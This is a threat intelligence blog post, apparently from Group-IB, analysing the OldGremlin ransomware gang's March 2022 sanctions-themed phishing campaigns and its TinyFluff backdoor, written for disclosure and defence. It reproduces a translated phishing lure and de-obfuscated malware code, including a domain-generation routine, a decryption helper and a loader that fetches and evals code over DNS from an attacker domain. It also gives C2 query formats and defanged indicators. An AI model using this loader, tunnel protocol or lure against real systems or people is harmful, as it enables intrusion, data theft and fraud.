Groups that violated the rule were few and far between, and\n**[OldGremlin was one of them. Since spring 2020, when the \"gremlins\" were first uncovered](https://blog.group-ib.com/oldgremlin)**\nby Group-IB Threat Intelligence analysts, the hackers have been attacking Russian\nbusinesses, including banks, industrial enterprises, medical organizations, and software\ndevelopers.\n\nAccording to a Singapore-based cybersecurity company Group-IB, over the past two years\nOldGremlin has conducted 13 malicious email campaigns. The year 2020 was the most\nfruitful: ten campaigns, with emails purporting to be from a Russian metallurgical holding, the\nBelarusian plant MTZ, a dental clinic, and the media holding RBC, nine of which were\n[described in Group-IB's 2020 report. One more campaign was discovered later in the year.](https://www.group-ib.com/media/oldgremlin/)\n\nAfter the first attacks, it became clear that OldGremlin prepares their phishing emails with\ngreat care and monitors the news agenda closely. Their choices for email subjects included\nremote work during the pandemic, protests in Belarus, and an interview request from a\nknown financial journalist working for a Russian media outlet, called RBC.\n\nAnother OldGremlin hallmark is that the group conducts multi-stage targeted attacks using\nsophisticated tactics and techniques. For example, they did not send their TinyCryptor\nransomware directly by email; instead they first obtained remote access to the victim's\nmachine. The latter was used as a springboard to conduct reconnaissance, collect data, and\nthen move laterally across the organization's network.\nOldGremlin launched only one mass phishing email campaign in 2021 (in February), but it\nwas so successful that, apparently, it fueled the gang for the entire year. A few months later,\nGroup-IB team discovered that the February email campaign was the initial entry point and\nsource of a number of attacks. Moreover, last year OldGremlin became the greediest\ncybergang targeting Russia: they demanded as much as $3 million from one of their victims.\n\nIn late March 2022, OldGremlin put themselves on the radar with two malicious email\ncampaigns. As in past attacks, the group bombarded Russian companies with another batch\nof emails exploiting trending news topics. This time they played the sanctions card,\nmasquerading as representatives of a Russian financial organization.\n\nGiven the fact that many international providers of email security products suspended\noperations on the Russian market, the campaigns of OldGremlin and other threat actors that\nuse email at the initial stage are likely to become more successful and frequent.\n\nHaving identified one potential victim (a mining company), Group-IB Computer Emergency\nResponse team (CERT-GIB) warned the company in question about the threat.\n\nIn this blog post, Group-IB experts share technical descriptions of OldGremlin's new attacks\nand tools and map the group's main tactics techniques and procedures (TTPs) to the MITRE\n\n\n-----\n\nATT&CK™ framework.\n\n## March 22 Campaign\n\nA new OldGremlin's attack was detected on March 22, 2022. Before the campaign, on March\n2, the attackers registered the domain mirfinance[.]org with namecheap, set it up with the\npublic email service Yandex.Mail and sent malicious emails to Russian companies. The use\nof public legitimate email service sometimes allows the attackers to bypass traditional\nsecurity systems.\n\nDNS records for mirfinance[.]org. Source: Group-IB Threat Intelligence\n\nAs mentioned above, carefully crafted phishing emails are OldGremlin's hallmark. This time\nthe emails were allegedly sent by a senior accountant of a financial organization in Russia\nwho warned the recipients about new sanctions that would completely suspend operations of\nVisa/Mastercard payment systems. Notably, the phishing emails were sent two weeks after\n[Visa and Mastercard announced they would suspend operations in Russia.](https://www.reuters.com/business/finance/visa-suspends-operations-russia-over-ukraine-invasion-2022-03-05/)\n\n\"All cards issued in our country [Russia] will no longer work,\" the phishing email said and\nprompted the recipients to urgently issue a new banking card and link it to the bank payroll.\n\nOldGremlin's phishing email from the March 22 campaign\n\n\n-----\n\nTranslation of the phishing email:\n\n_Hello,_\n\n_We, at [masked], have received reliable information about new sanctions that will be_\n_imposed in the next couple of days. The Visa/Mastercard payment system will be shut down_\n_completely. All cards issued in our country will no longer work._\n\n_Everyone must therefore urgently issue [masked] cards and link them to their bank payroll._\n_Use the following instructions [hyperlink] for the following banks: [masked]_\n\n_Fill out the form (see attachment) and send it back, making sure to specify the bank branch_\n_at which it is convenient for you to pick up the bank card._\n\n_Remember that if you want to link a card to a payroll, you must inform the accounting_\n_department of the account details after receiving the card._\n_Please sign and send the form to our email address within 5 (five) hours from the moment_\n_you receive this email. For the purposes of efficiency, please send it in this email thread_\n_chain._\n\n_[masked],_\n_Senior Accountant at [masked]_\nTo have a new payment card \"issued\", the client was supposed to read the guidelines and fill\nout a questionnaire. In reality, the emails contained links to a malicious document stored in\nDropbox: hxxps://dl[.]dropboxusercontent[.]com/s/1956cypkkihawuu/Anketa.docx?\n**dl=0. The document looked as follows:**\n\n\n-----\n\nMalicious document stored in Dropbox\n\nTranslation:\n\n_This document was created using the online version of Microsoft Office Word. To view or edit_\n_the document, click on the \"Enable content\" button on the top yellow stripe._\n\nIt is noteworthy that in February 2021, the threat actor sent emails leveraging a malicious\ndocument containing a similar Office 365 image. The campaign affected multiple companies,\nand OldGremlin is still reaping the benefits, as they are known for dwelling in the victims'\ninfrastructure for a long time before proceeding to the next stage.\n\nTo return to the recent attack, the infection scheme is presented below for clarity:\n\n\n-----\n\nOldGremlin's March 22 attack\n\nOnce opened, the document loads a template located at\n**hxxps://dl[.]dropboxusercontent[.]com/s/gjyjs0rbtihy7ue/Doc1.dotm. The template**\ncontains a macro that performs the following actions:\n\n1. Copies the original file (Anketa.docx) to the path %TEMP%\\docx1.zip.\n\n2. Extracts an executable file from the archive embedded in the original document to the\n\npath %TEMP%\\word\\media\\image2.jpg, renames the file to image2.exe and\nlaunches it.\n\n3. Displays an error and closes the document.\n\nThe archive contained the group's new tool, which — judging by the PDB string — the\ndeveloper named TinyFluff. TinyFluff is a successor to the gang's custom backdoor called\nTinyNode, which OldGremlin used as the primary downloader for receiving and running\nmalicious scripts. The purpose of TinyFluff was to launch the interpreter Node.js on the\ninfected device and grant remote access to it (a detailed description of the interpreter can be\nfound in the \"Tools\" section).\n\n**The key features of this version of TinyFluff are:**\n\n\n-----\n\n1. The application downloads Node.js from the official website.\n\n2. JavaScript is embedded in the file body.\n\n3. It does not contain a hardcoded command and control (C2) address; instead the\n\napplication uses DGA.\n\n4. All communication with C2 servers is performed through a DNS tunnel.\n\nAmong the generated domains, two definitely belonged to the attackers. The rest were either\nnot registered at the time of analysis or Group-IB experts could not find evidence that they\nwere involved in the attack:\n\nWe will return to the table above, but for now we will continue to describe the cyber kill chain.\n[Group-IB's Threat Hunting Framework extracted some of the JavaScripts used in this](https://www.group-ib.com/threat-hunting-framework.html)\ncampaign. In particular, Group-IB detected an interesting — though still \"raw\" — script with a\nwide functionality:\n\nCommunication with the C2 server through a DNS tunnel\nGathering information about infected devices\nStealing files from infected devices\nDownloading arbitrary files from servers\nDeploying a SOCKS server to proxy traffic\nExecuting arbitrary JS code\n\n## March 25 Campaign\n\nThree days later, on March 25, the group launched a new campaign, but using a more\nsimplified toolkit. The likely reason for this is that the final script used in the previous attack\nwas not yet ready for full-fledged use in the wild. It required additional testing and additional\nfeatures. The bad news is that OldGremlin will most likely perfect their script and use it in\nfuture attacks.\n\nUnfortunately, Group-IB has not yet uncovered any email samples (if you have received one,\nplease let us know), but our specialists did reconstruct the second attack.\n\n\n-----\n\nOldGremlin's March 25 attack\n\nThe attack was identified following the analysis of OldGremlin's infrastructure. Group-IB\ndiscovered two LNK files that were associated with the IP address 46.101.113[.]161 (used to\nresolve NS records for subdomains from the previous malicious email campaign). Both files\nwere located in archives available for downloading from Dropbox:\n\nGroup-IB experts believe that the above links were embedded in the emails sent by the\ngroup. When launched, the LNK files executed the following commands:\n\nHere is what happened: using WebDAV protocol the threat actors mapped the network drive\n**hxxp://192.248.176[.]138, displayed the decoy document (DopSog_Consultant.docx or**\n**Akt_sverki_Consultant.docx), and launched the malicious executable file tf.exe. The**\ndecoy documents looked as follows:\n\n\n-----\n\nDecoy document Akt_sverki_Consultant.docx (Translation: Reconciliation certificate)\n\n\n-----\n\nDecoy document DopSog_Consultant.docx (Translation: Supplementary Agreement)\n\n[Obviously, the legitimate company Consultant Plus has nothing to do with documents used in](https://en.wikipedia.org/wiki/Consultant_Plus)\nthe campaign.\n\nThe payload, as you may have guessed, is TinyFluff. Unlike the file used in the March 22\ncampaign, however, this version does not have a built-in script and does not download the\nNode.js interpreter from the official website. Instead, the application copies both the script\nand the interpreter from its own current location, i.e., from the network drive\n**192.248.176[.]138.**\n\nThe final-stage script is much simpler than the above version. It lacks both DGA (the IP\naddress 46.101.113[.]161 is specified as C2) and data encryption. In fact, all communication\nbetween the Trojan and C2 could be viewed using an ordinary traffic sniffer.\n\nGroup-IB experts retrieved several JS commands that were executed on the infected device.\nThey were all designed to obtain information about an infected device. They even included\nCMD commands (as described in the corresponding section).\n\n\n-----\n\n## Tools\n\nTinyFluff\n\nAs mentioned above, Group-IB experts detected two versions of TinyFluff:\n\nLet's begin with the tf.exe file (SHA1: c82e12e563d5d5f4a8dd67703b5df7373b457abc) as\nthe tool is much simpler than its predecessor. Once launched, the application creates the\ndirectory %APPDATA%\\%MachineGuid%, where %MachineGuid% is the registry value for\n**HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid. If the**\ndirectory already exists, the application terminates itself. The application copies the\ninterpreter Node.js (node.exe) and the malicious script s.txt to the created directory. The\nscript is heavily obfuscated, but if it can be run then there is no need to waste time on deobfuscation because the obfuscated layer restarts Node.js and passes a \"clean\" script to it\nas an argument.\n\n[How Group-IB Managed XDR's module called Threat Hunting Framework Polygon displays](https://www.group-ib.com/threat-hunting-framework.html)\nthe attack\n\nAs seen in the screenshot, the argument of the second node.exe process is a script without\nobfuscation. Its functionality is simple: it connects to the address 46.101.113[.]161:80,\npasses the format identifier /{0.[0-9]*/}, receives the command in a loop, and executes it\n(using the function eval). The commands are described in detail in the relevant section.\n\nAlthough the second version of TinyFluff (SHA1:\nbd0a6a3628f268a37ac9d708d03f57feef5ed55e) was discovered earlier (and the compilation\ndate is more recent), it is more sophisticated. Just like the previous version, it places the\nscript and the interpreter in the directory %APPDATA%\\%MachineGuid%. However, the\ninterpreter is downloaded from the official website: http://nodejs.org/dist/latest-erbium/winx86/node.exe, and the malicious script is located in a resource of the executable file named\n\n\n-----\n\n**TXT. As in the above case, the de-obfuscated script can be obtained from an argument of**\nthe node.exe child process:\n\nSource: Group-IB Managed XDR\n\nThis time the script is more complicated. For example, it doesn't have a built-in C2 list.\nInstead, the script uses DGA:\n```\nconst a=[0…0x1e4]\nconst tld=[\".com\",\".org\",\".net\"],\ndomain=crypto.createHash(\"md5\").update(a.toString()).digest(\"hex\").slice(0,6)+tld[f]\n\n```\nFor each domain, the script generates a subdomain in the format [0-9a-f]{4}.[0-9a-f]\n**{8}.%dga_domain%, creates a DNS query, and receives a TXT record. The tool carries out**\nall communication through a DNS tunnel, which means that all the data transmitted by the\nTrojan is in a subdomain and the server's response is in a TXT record. We will not dwell on\nthis any further as we believe that all interaction with the server occurs in this way.\n\nThe script verifies the digital signature of the received data using the function crypto.verify\nwith the base64-encoded key\n**MCowBQYDK2VwAyEAgp0p9o6lg/ZZ3WUJtx7UBBb1qYMZEDNC19Hbb84wt88= (in**\nDER format). If the signature is valid, the script generates a bot identifier (a number from 0 to\n1), after which it requests a command from the C2 server in a loop. The response is\nobfuscated. De-obfuscation is performed as follows:\n\n1. Data is Base64-decoded.\n\n2. Data is decrypted using the RC4 algorithm (in such requests, the key is\n\n%id%.%dga_domain%, which is the domain to which a connection was made).\n\n3. The decrypted data is decompressed using the gzip algorithm.\n\n\n-----\n\nThe above described algorithm is used to de-obfuscate all traffic between the malware and\nthe C2 server, with only the key changing (going forward we will therefore only say that the\ndata is de-obfuscated using a given key). After de-obfuscation, a JS script is immediately\nexecuted by the interpreter. The textual description is complicated, so let's illustrate it using a\nsample analyzed by the THF Polygon. Registration looked as follows:\n\nThe example above shows that the domain eccbc8[.]com was generated using DGA and\nthat 0.058106102444631436 is the bot's unique identifier. The screenshot shows two TXT\nresponses, but at this stage we are only interested in the first one:\n```\nVl1Ok4WH0QkAA3xSgGwyotPYGd0Q4X4LeLYTqO0mgklgbunlqCBxhnEilFysI2UrJWKsy0Q+BgoB+ox0d+DQMi\n\n```\nWe will return to the second response later. If you use the following script:\n```\ncrypto=require(\"crypto\"),\nglobal.dec=(key,ciphertext)=>{\n     const a=require(\"crypto\").createDecipheriv(\"rc4\",key,null),\n     k=a.update(ciphertext,\"base64\"),\n     b=require(\"zlib\").gunzipSync(k);\n     return a.final(),b.toString()\n}\n\n```\nand the key 0.058106102444631436.eccbc8[.]com, you will receive the first command:\n```\nlet C = 0,\n     P = \"\",\n     K = \"lin9gtmn\",\n     R = () => {\n     require(\"dns\").resolveTxt(\"0x\" + C + \".\" + K + \".eccbc8[.]com\", (e, d) => {\n          if (d) {\n          if (P += d.join(\"\"), C++, C < 23) return R();\n          try {\n              eval(global.dec(K, P))\n          } catch (a) {}\n          }\n     })\n     };\nR()\n\n```\nAs can be seen, the first command is designed to download and run the next-stage tool. To\ndo so, it performs 23 DNS queries (such as 0x%chank_number%.lin9gtmn.eccbc8[.]com),\nconcatenates the responses into a string, de-obfuscates it using the key lin9gtmn, and\n\n\n-----\n\nlaunches it. An example of such requests:\n```\n0x0.lin9gtmn.eccbc8[.]com\n0x1.lin9gtmn.eccbc8[.]com\n...\n0x22.lin9gtmn.eccbc8[.]com\n\n```\nThe resulting script has many functions, including:\n\nSending multiple DNS queries at the same time\n\nGathering information about infected devices\n\nStealing files from infected devices\n\nDownloading arbitrary files from servers\n\nDeploying a SOCKS server to proxy traffic\n\nIt is noteworthy that at the time of analysis, the resulting script was unfinished: Group-IB\nresearchers came across errors in the script code and the persistence function was\ncommented out. Moreover, from all the above functions, the script only performs one, namely\ncollecting information about the infected device in a JSON object in the following format:\n\n\n-----\n\n```\n{\n     \"transfer\": {\n     \"threads\": \"global.threads\",\n     \"tick\": \"global.tick\",\n     \"domain\": \"global.dom\"\n     },\n     \"paths\": {\n     \"temp\": \"os.tmpdir()\",\n     \"home\": \"os.homedir()\"\n     },\n     \"proc\": {\n     \"load\": \"os.loadavg()\",\n     \"cpus\": \"os.cpus()\"\n     },\n     \"mem\": {\n     \"total\": \"os.totalmem()\",\n     \"free\": \"os.freemem()\"\n     },\n     \"network\": {\n     \"interfaces\": \"os.networkInterfaces()\"\n     },\n     \"sys\": {\n     \"hostName\": \"os.hostname()\",\n     \"type\": \"os.type()\",\n     \"platform\": \"os.platform()\",\n     \"release\": \"os.release()\",\n     \"uptime\": \"os.uptime()\"\n     },\n     \"user\": \"os.userInfo()\"\n}\n\n```\nThe data is once again obfuscated using the lin9gtmn key, split into chunks of 60 bytes, and\nsent as several requests in the following format:\n\nFormat\n```\n1x%chank_number%.%key%.%random_string{8}%.%hex_chunk%.eccbc8[.]com\n\n```\nPolygon example\n```\n1x2.lin9gtmn.v937nf2g.01e35a4076d1b5a1f285b49c11d2a96230b8ce152e9b3877243b7e5234bb.c31\n\n```\nIn response, the server sends an obfuscated JavaScript to be executed. In our case, GroupIB experts did not receive any additional commands. However, do you remember that we\nplanned to return to the second response? Here it is:\n\n\n-----\n\nThe second command from the server after de-obfuscation looks as follows:\n```\nif(global.connect)global.connect()\n\n```\nAnd this script runs the second large piece of code from the final-stage script. First, the code\nmakes a request to the server in order to obtain connection parameters. The request is as\nfollows:\n\nFormat\n```\n2x.%uid%.%id%%rand_string{2}%.%dga_domain%\n\n```\nPolygon example\n```\n2x.058106102444631436.079i4mjd6c.eccbc8[.]com\n\n```\nThe response is data in the format %threads%:%width%:%expire%, obfuscated with the\n**%id% key. To avoid overloading the article with in-depth technical details, we will not**\ndescribe what these fields mean. We will only note that these variables are responsible for\nthe number of simultaneous DNS requests, the number of simultaneously processed\ncommands from the server, and the run time of the command handler script.\n\nHaving obtained the connection parameters, the script launches the function used to handle\ncommands from the server. The function makes a request to the server in order to receive\n\n\n-----\n\ncommands:\n\nFormat\n```\n3x.%uid%.%dga_domain%\n\n```\nPolygon example\n```\n3x.058106102444631436.eccbc8[.]com\n\n```\nThe script processes the following commands:\n\nIt is worth noting that this section of the code logs the progress of its work, but in order to\ntransfer data to the server the code uses the function this.send (not defined in the code).\nThe function accepts this.proc.stdout as the first argument. Moreover, the result of the\n**.download: command is processed in the same way. This evidence may indicate that this**\npiece of code is still being developed.\n\nThe code also contains two functions whose names speak for themselves: _socks and\n**_eval. Group-IB experts have not seen them being used in the code, which means that they**\ncan probably be called on the server's command. Moreover, the threat actors commented out\na part of the script code that ensures persistence in the system by creating the file\n**OneDrive.cmd in the Microsoft\\Windows\\Start Menu\\Programs\\Startup directory and**\nadding to it a command to start the Node.js interpreter with the s.txt argument.\n\n## Commands\n\nAs mentioned above, on March 25, Group-IB experts obtained and analyzed several\ncommands. The commands were being used for reconnaissance, after which the attackers\n(or their script) realized that the application was launched in a test environment and sent a\ncommand to terminate the interpreter. All commands were sent in clear text, which made it\npossible to examine them using a traffic sniffer:\n\n\n-----\n\nAn example of traffic between an infected device and a server\n\nCommands can be divided by functionality into six scripts that perform the following actions:\n\n1\n\nCollecting information about the infected system/device:\n\nCPU\n\nComputer name, memory capacity\nNetwork information (IP and MAC addresses)\nOS information\nPath to the %Temp% directory\nSystem run time\n\n2\n\nObtaining information about connected drives\n\n3\n\nLaunching the cmd.exe shell, executing a command, and sending the output to C2. During\nour research, the following commands were executed:\n\nipconfig /all\n\nkill\n\n4\n\n\n-----\n\nObtaining information about the plugins installed in the system. At the time of research no\nplugins had been loaded, so we have only their names:\n\nTSFR\nSHLL\nNESC\nPRSE/PRST\nFWSE\nSPPU/SPPR\nSRPU/SRPR\nATSE\n\n5\n\nObtaining information about files in the following directories:\n\nThe directory in which the malicious script and the Node.js interpreter are located\nC:\\\nC:\\Users\nC:\\Users\\<%username%>\nC:\\Users\\<%username%>\\Downloads\n\n6\n\nTerminating the Node.js interpreter\n\nGroup-IB researchers did not manage to obtain more commands during the analysis, but\neven based on this short list, we can conclude that OldGremlin prepared a sufficient number\nof scripts to ensure full-fledged post-exploitation.\n\nConclusion\n\nAfter a long break of more than a year, in March 2022 the ransomware gang OldGremlin\nresumed their malicious email campaigns targeting Russian companies. They remain one of\nthe very few Russian-speaking ransomware gangs operating in Russia. As in their past\nattacks, the gremlins used carefully crafted fake emails, an up-to-date news agenda, and\nnew custom tools. The latter included TinyFluff, which we analyzed in detail. We have\nreason to believe that the new campaigns may have infected a large number of companies\nand that in the coming months the attackers will slowly and carefully move through their\ninfrastructure, bypassing existing security systems.\n\nTo prevent ransomware attacks, Group-IB recommends that companies use Group-IB\nManaged XDR to protect their infrastructure against targeted attacks and proactively hunt for\n\n\n-----\n\nthreats using Threat Intelligence data. We also advise cybersecurity analysts to explore the\nlist of OldGremlin's tactics, techniques and procedures shared below, which is mapped to the\nMITRE ATT&CK matrix. Group-IB's Threat Intelligence & Attribution team will continue to\nmonitor the group's activities and promptly notify customers about any new attacks.\nTry Group-IB Threat Intelligence Now\n\nOptimize strategic, operational and tactical decision making with best-in-class threat\nintelligence\n\nTest Drive Group-IB Threat Intelligence\n\nMITRE\n\nIOCs\n\n\n-----\n\nNetwork\n\nDomains\n\nIPs\n\n192.248.176[.]138\n46.101.113[.]161\n161.35.41[.]9\n\n_Updated on Apr. 14, 10:30 GMT_\nURLs\n\nhxxps://dl[.]dropboxusercontent[.]com/s/1956cypkkihawuu/Anketa.docx?dl=0\nhxxps://dl[.]dropboxusercontent[.]com/s/gjyjs0rbtihy7ue/Doc1.dotm\nhXXps://dl.dropboxusercontent[.]com/s/9kng4v6vuq7mq39/akt_sverki.zip?dl=0\nhXXps://dl.dropboxusercontent[.]com/s/fq8ew6gl3x46rjc/Akt_sverki.zip?dl=0\nhXXps://dl.dropboxusercontent[.]com/s/lf1w11jxp2z0f6s/Akt_sverki.zip?dl=0\nhXXps://dl.dropboxusercontent[.]com/s/hy2ub5wnns4c0fi/Akt_sverki.zip?dl=0\nhXXps://dl.dropboxusercontent[.]com/s/ivopsmmssq04p92/DopSog_Consult.zip?dl=0\nhXXps:://dl.dropboxusercontent[.]com/s/mt0boz6v3u11hlx/DopSog_Consult.zip\nhXXps:://dl.dropboxusercontent[.]com/s/ocrracouta681r5/DopSog_Consult.zip?dl=0\n\nFiles\n\n2022-03-22\n\n2022-03-25\n\n\n-----",
